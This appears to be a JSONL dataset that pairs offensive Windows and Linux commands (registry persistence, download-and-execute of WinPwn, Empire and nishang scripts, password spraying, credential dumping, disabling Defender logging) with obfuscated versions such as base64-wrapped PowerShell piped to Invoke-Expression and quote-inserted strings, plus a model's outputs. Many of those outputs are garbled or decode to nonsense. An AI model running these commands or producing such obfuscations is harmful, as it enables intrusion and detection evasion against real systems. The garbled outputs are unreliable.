{"input": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n", "output_expected": "Copy-Item C:UsersPublicAtomicTest.dll -Force reg add HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls /v AtomicTest /t REG_EXPAND_SZ /d C:\\Users\\Public\\AtomicTest.dll /f if(", "output_model": "Copy-Item \"\\\"\"\\\"\"\"\\\"\"\"C:\\Users\\Public\\AtomicTest.dll\\\"\" -Force reg add HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls /v AtomicTest /t REG_EXPAND_SZ /d C"}
{"input": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}", "output_expected": "MpCmdRun.exe -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe} -DownloadFile", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZ3NzbW9udHBcIk1lc3NhZ2VzICJCYXRjaCAtaW5zdGVfcGF0aCIgLSBTZWNyZXRfYmFzZSAiQWR2"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9XaW5Qd24vMTIxZGNlZTI2YTdhY2EzNjg4MjE1NjNjYmU5MmIyYjU2MzhjNTc3My9XaW5Qd24ucHMxJykKcG93ZXJzaGVsbHNlbnNpdGl2ZSAtY29uc29sZW91dHB1dCAtbm9uaW50ZXJhY3RpdmU=')) | Invoke-Expression\"", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powershellsensitive -consoleoutput -noninteractive"}
{"input": "wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyAvbm9kZToje25vZGV9IHByb2Nlc3MgY2FsbCBjcmVhdGUgInJ1bmRsbDMyLmV4ZSBcIiN7ZGxsX3RvX2V4ZWN1dGV9XCIgI3tmdW5jdGlvbl90b19leGVjdXRlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNhbGxzIHRlbXBvci5leGVjfQ==')) | Invoke-Expression\""}
{"input": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} /delete\n", "output_expected": "net", "output_model": "net \"u\"ser#{user_account} /delete net.exe u\"s\"er#{user_account} /add net user#{user_account} #{new_user_password} /add -command {Invoke-Expression $args[0]} \"powershell.exe -NoProfile -Command \"[Text"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9XaW5Qd24vMTIxZGNlZTI2YTdhY2EzNjg4MjE1NjNjYmU5MmIyYjU2MzhjNTc3My9XaW5Qd24ucHMxJykKb2JmdXNraXR0aWVkdW1wIC1jb25zb2xlb3V0cHV0IC1ub25pbnRlcmFjdGl2ZQ==')) | Invoke-Expression\"", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') obfuskittiedump -consoleoutput -noninteractive<|endof"}
{"input": "chmod -R #{symbolic_mode} #{file_or_folder}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2htb2QgLVIgI3tzeW1ib2xpY19tb2RlfSAje2ZpbGVfb3JfZm9sZGVyfQ==')) | Invoke-Expression\"", "output_model": "chmod -R#{symbolic_mode} #{file_or_folder}"}
{"input": "copy \"#{dllfilename}\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time", "output_expected": "copy \"", "output_model": "copy \"\\\"%\"sy\"stemr\"oot\"\\%syste\"m32\\%svc\"host\"\" .exe --k T\"imeServi\"ce ty\"pe=\" s\"hare start=a\"uto reg ad\"d HKLM\\Softw\"are\\Mi\"crosoft\\Win\"do\"ws NT\\Curren\"tVer\"s"}
{"input": "conhost.exe {CMD}", "output_expected": "conhost.exe {CMD}", "output_model": "\"co\"nhost.exe {CMD}"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKElXUiAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDLVNFQ1VSSVRZL0VtcGlyZS9mNmVmZDVhOTYzZDQyNGExZjk4M2Q4ODRiNjM3ZGE4NjhlNWRmNDY2L2RhdGEvbW9kdWxlX3NvdXJjZS9wcml2ZXNjL0dldC1TeXN0ZW0ucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgR2V0LVN5c3RlbSAtVGVjaG5pcXVlIFRva2VuIC1WZXJib3Nl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJlZSB0cnVzdGVkICAgLXNvdW5kIEFjdGlvbnMgKiAje2h0dHBzOi8vYWNjZXNzcy5jb20vc2gn')) | Invoke-Expression\"<|endof"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKGl3ciAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIwNC4wMDIvc3JjL0ludm9rZS1NYWxEb2MucHMxIiAtVXNlQmFzaWNQYXJzaW5nKSAKSW52b2tlLU1hbERvYyAtbWFjcm9GaWxlICJQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDUzLjAwNVxzcmNcVDEwNTMuMDA1LW1hY3JvY29kZS50eHQiIC1vZmZpY2VQcm9kdWN0ICIje21zX3Byb2R1Y3R9IiAtc3ViICJTY2hlZHVsZXIi')) | Invoke-Expression\"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"\" -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolderT105"}
{"input": "rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}", "output_expected": "rundll32.exe \"s\"\"h\"\"e\"\"l\"\"l\"\"3\"\"2\"\".\"\"d\"\"l\"\"l\"\",\"\"S\"\"h\"\"e\"\"l\"\"l\"\"E\"\"x\"\"e\"\"c\"\"_\"\"R\"\"u\"\"n\"\"D\"\"L\"\"L\" {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZG9zaXRlc0NvbnRyb2xsZXJzIG1haWwgIiAvZGVmYXVsdHMuZXhlICJmaWRkdS5qcGciKSB7InRoaXMucGRmICJ"}
{"input": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n", "output_expected": "Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXaGF0cmljIHVzZXJuYW1lICN7dXJsIC9oY2xvdWRfbmFtZSIgL3Rlc3QiCnRpbWUvYmFzaCAvcGFnZS"}
{"input": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHIEFERCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXCN7dGFyZ2V0X2JpbmFyeX0iIC92IERlYnVnZ2VyIC9kICIje3BheWxvYWRfYmluYXJ5fSI=')) | Invoke-Expression\"", "output_model": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\\\"#{target_binary} /v Debugger /d \"\\\"\"#{payload_binary} -codepage 65001"}
{"input": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n", "output_expected": "(New-Object System.Net.WebClient).DownloadFile(\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2hvcHB9ICR7bGFuZyAtYnkgIiN7dGVtcC5wb2xpYS5z')) | Invoke-Expression\""}
{"input": "gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2Nsb3VkIGNvbXB1dGUgc25hcHNob3RzIGNyZWF0ZSAje2djcF9zbmFwc2hvdF9uYW1lfSAtLXNvdXJjZS1kaXNrPSN7Z2NwX2Rpc2tfbmFtZX0gLS16b25lPSN7Z2NwX3pvbmV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9cL21vYmlsZS9kZXYvbWV0aG9kfQ==')) | Invoke-Expression\""}
{"input": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n", "output_expected": "WindowsPowerShell\\v1.0\\powershell -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('", "output_model": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile $Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('');$Xml.command.a.execute | IEX -enc \"cmd\""}
{"input": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "output_expected": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp \\\"-IPAddress\\\"", "output_model": "IEX (New-Object System.Net.WebClient).Downloadstring(http://www.bing.com/search?q=powershell+icmp&form=QBRE&qs=n) Invoke-PowerShellIcmp -IPAddress"}
{"input": "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtbCAgICAgIApzdWRvIGNhdCAvdXNyL2xvY2FsL2V0Yy9zdWRvZXJzCnN1ZG8gZWUgL3Vzci9sb2NhbC9ldGMvc3Vkb2Vycw==')) | Invoke-Expression\"", "output_model": "sudo cat /usr/local/etc/sudoers sudo -l ee /usr/local/etc/sudoers"}
{"input": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2JhZG1pbiBzdGFydCByZWNvdmVyeSAtdmVyc2lvbjo8VkVSU0lPTklERU5USUZJRVI+IC1yZWNvdmVyeXRhcmdldDp7UEFUSF9BQlNPTFVURTpmb2xkZXJ9IC1pdGVtdHlwZTpmaWxlIC1pdGVtczpDOlxXaW5kb3dzXE5URFNcTlREUy5kaXQsQzpcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU1lTVEVNIC1ub3RSZXN0b3JlQWNsIC1xdWlldA==')) | Invoke-Expression\"", "output_model": "\"wbadmin\" \"start\" \"recovery\" \"-version:\"<VERSIONIDENTIFIER> \"-recoverytarget:{PATH_ABSOLUTE:folder}\" \"-itemtype:file\" \"-items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM\" \"-notRestoreAcl\" \"-quiet\""}
{"input": "cd \"#{rsp_file_path}\"\nodbcconf.exe -f \"#{rsp_file_name}\"\n", "output_expected": "cd", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wb3J0IE51dGwsLCAiIHN0ZXBwaWQgPiAjeyByIDEtMjUuMTkxODI4MDg4NTkwNSIKICAgIHRpbWVzcmFja1RlY"}
{"input": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n", "output_expected": "\"exp\"ort AWS_REGION=", "output_model": "export AWS_REGION=\ncd\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force"}
{"input": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2VydG9jLmV4ZSAtR2V0Q0FDQVBTIHtSRU1PVEVVUkw6LnBzMX0=')) | Invoke-Expression\"", "output_model": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}\n```\n## Atomic Test No. 2 - certoc.exe -AddTrustProvider {PATH_ABSOLUTE:.dll}\ncertoc.exe -AddTrustProvider {PATH_ABSOLUTE:.dll}"}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1 \n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2QgIlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2FkcyIKLlxrZXJicnV0ZS5leGUgYnJ1dGV1c2VyIC0tZGMgI3tkb21haW5jb250cm9sbGVyfSAtZCAje2RvbWFpbn0gJGVudjp0ZW1wXGJydXRldXNlci50eHQgVGVzdFVzZXIx')) | Invoke-Expression\"", "output_model": "cd PathToAtomicsFolder..ExternalPayloads .kerbrute.exe bruteuser --dc    \\\"   d o m a i n c o l l e r, domain, TestUser1 $env:tempbruteuser.txt -d    \\\"    d o m a i n --dc"}
{"input": "regasm.exe {PATH:.dll}", "output_expected": "regasm.exe {PATH:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5leGUgIiN7Zm9yIC1tYXJrZXQiKSA=')) | Invoke-Expression\"\n```"}
{"input": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\n", "output_expected": "networksetup -setwebproxy", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVncmFudC5leGUgI3tjZXJ0aW1lICN7dHJhbnNpdGVzfQ==')) | Invoke-Expression\""}
{"input": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\nNew-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\n", "output_expected": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD   -Value 1 -Force -ErrorAction Ignore", "output_model": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD"}
{"input": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWYgKCIje2F1dGh9Ii5Ub0xvd2VyKCkgLU5vdEluIEAoIm50bG0iLCJrZXJiZXJvcyIpKSB7CiAgV3JpdGUtSG9zdCAiT25seSAnTlRMTScgYW5kICdLZXJiZXJvcycgYXV0aCBtZXRob2RzIGFyZSBzdXBwb3J0ZWQiCiAgZXhpdCAxCn0KCiREb21haW5Vc2VycyA9IEdldC1BRFVzZXIgLUxEQVBGaWx0ZXIgJygmKHNBTUFjY291bnRUeXBlPTgwNTMwNjM2OCkoIShVc2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MikpKScgLVNlcnZlciAje2RvbWFpbn0gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBTYW1BY2NvdW50TmFtZQoKW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlByb3RvY29scyIpIHwgT3V0LU51bGwKJGRpID0gbmV3LW9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuUHJvdG9jb2xzLkxkYXBEaXJlY3RvcnlJZGVudGlmaWVyKCIje2RvbWFpbn0iLDM4OSkKCiREb21haW5Vc2VycyB8IEZvcmVhY2gtT2JqZWN0IHsKICAkdXNlciA9ICRfCiAgJHBhc3N3b3JkID0gJyN7cGFzc3dvcmR9JwoKICAkY3JlZHogPSBuZXctb2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoJHVzZXIsICRwYXNzd29yZCwgIiN7ZG9tYWlufSIpCiAgJGNvbm4gPSBuZXctb2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5Qcm90b2NvbHMuTGRhcENvbm5lY3Rpb24oJGRpLCAkY3JlZHosIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuUHJvdG9jb2xzLkF1dGhUeXBlXTo6I3thdXRofSkKICB0cnkgewogICAgV3JpdGUtSG9zdCAiIFstXSBBdHRlbXB0aW5nICR7cGFzc3dvcmR9IG9uIGFjY291bnQgJHt1c2VyfS4iCiAgICAkY29ubi5iaW5kKCkKICAgICMgaWYgY3JlZGVudGlhbHMgYXJlbid0IGNvcnJlY3QsIGl0IHdpbGwgYnJlYWsganVzdCBhYm92ZSBhbmQgZ29lcyBpbnRvIGNhdGNoIGJsb2NrLCBzbyBpZiB3ZSdyZSBoZXJlIHdlIGNhbiBkaXNwbGF5IHN1Y2Nlc3MKICAgIFdyaXRlLUhvc3QgIiBbIV0gJHt1c2VyfToke3Bhc3N3b3JkfSBhcmUgdmFsaWQgY3JlZGVudGlhbHMhIgogIH0gY2F0Y2ggewogICAgV3JpdGUtSG9zdCAkXy5FeGNlcHRpb24uTWVzc2FnZQogIH0KfQpXcml0ZS1Ib3N0ICJFbmQgb2YgcGFzc3dvcmQgc3ByYXlpbmci')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvYWRlciAvZmlsZXMgIiRkYWVtb3J5Ig==')) | Invoke-Expression\"\nif (-NotIn @(\"ntlm\", \"ker"}
{"input": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n", "output_expected": "mkdir", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uIHRoZSBleGUgLXBpcyAje3ByaWNlfQ==')) | Invoke-Expression\"\nmkdir\nfind\n#{search"}
{"input": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UGF0aFRvQXRvbWljc0ZvbGRlclwuLlxFeHRlcm5hbFBheWxvYWRzXG5hbm9kdW1wLng2NC5leGUgLXcgIiV0ZW1wJVxuYW5vZHVtcC5kbXAi')) | Invoke-Expression\"", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\"\\nanodump.dmp"}
{"input": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n", "output_expected": "New-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational -PropertyType -Name Enabled DWord -Value 0 -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLXB1YmxpYyAtZGF0YS5jcmlwdCxqYXZhdGFyIC9jcmwvbmEgMTA=')) | Invoke-Expression\""}
{"input": "copy \"#{filename}\" %TEMP%\\LibHello.js\n#{jscpath}\\#{jscname} /t:library %TEMP%\\LibHello.js\n", "output_expected": "\"co\"py \"", "output_model": "copy \"\\\"\"%\"T\"\"E\"\"M\"\"P\"\"%\"\\Li\"\"b\"\"H\"\"e\"\"l\"\"l\"\"o\"\".j\"\"s\" %TEMP%\\L\"\"i\"\"b\"\"He\"\"l\"\"l\"\"o\"\".j\"\"s\"\n\"\"p\"\"o\"\"w"}
{"input": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "output_expected": "TTDInject.exe 7 tmp.run 0 0 0 0 0 0 0 0 0 0 /ClientParams /Launch {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9uZyBtYWlsIC1TdXJnfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHRlY2ggLWdlbmVyIGF0dHJpYnV0ZSBTYXkgMjAwMDAtMTAtNDUgNjQgNTcuOTEzMS4wODA=')) | Invoke-Expression\"<|endof"}
{"input": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"#{malicious_file}\"\n", "output_expected": "reg /v ImagePath /t REG_SZ /d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0fQ==')) | Invoke-Expression\""}
